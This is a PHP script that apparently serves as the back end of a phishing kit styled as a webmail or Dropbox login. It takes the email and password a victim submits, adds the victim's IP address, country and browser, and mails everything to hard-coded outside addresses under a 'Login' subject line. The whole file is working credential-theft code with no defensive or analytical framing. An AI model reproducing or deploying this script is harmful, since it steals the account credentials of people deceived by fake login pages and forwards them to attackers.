<?php
session_start();
$to ="beccismact@gmail.com,info@qenparmotor.com";
$xsam = getenv("REMOTE_ADDR");
$xadoo = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$xsam");
$COUNTRY = $xadoo->geoplugin_countryName ;  
$ip = getenv("REMOTE_ADDR");
$Email	=	$_POST["email"];
$Pass	=	$_POST["password"];
$browser             =   $_SERVER['HTTP_USER_AGENT'];

$Message =	"<b><font color='#3b3f40' size='4.5px'>-----------{ <font color='#f6546a'WEBMAIL >REZ LOGIN</font> }-----------</b><br>";
$Message .=	"<b>WEBMAIL Email : </b><font color='#0097ff'>".$Email."</font><br>";
$Message .=	"<b>WEBMAIL Pass : </b><font color='#0097ff'>".$Pass."</font><br>";
$Message .=	"<b>-----------{ <font color='#f6546a'><b>LOGIN INFOS</b></font>}-----------</b><br>";
$Message .=	"<b>IP Address : </b><a href='http://www.whoer.net/?IP=".$ip."'><font color='#c5405b'>".$ip."</font></a><br>";
$Message .= "Country:".$COUNTRY."</font><br>";
$Message .=	"<b>User Agent  : </b><font color='#c5405b'>".$browser."</font><br>";
$Message .=	"<b>-----------{ <font color='#f6546a'><b>DROPBOX</b></font> }-----------</b></font><br>";

$Subject = "[BLESSED] ~ Login ~ From ~ [$ip] Country [$COUNTRY]";

$Headers = "From: Resultz 2022 Biz-Yr <Vip@norepforsaliser.org>\r\n";
$Headers .= "MIME-Version: 1.0\r\n";
$Headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

//send mail

mail($to,$Subject,$Message,$Headers);


 
?>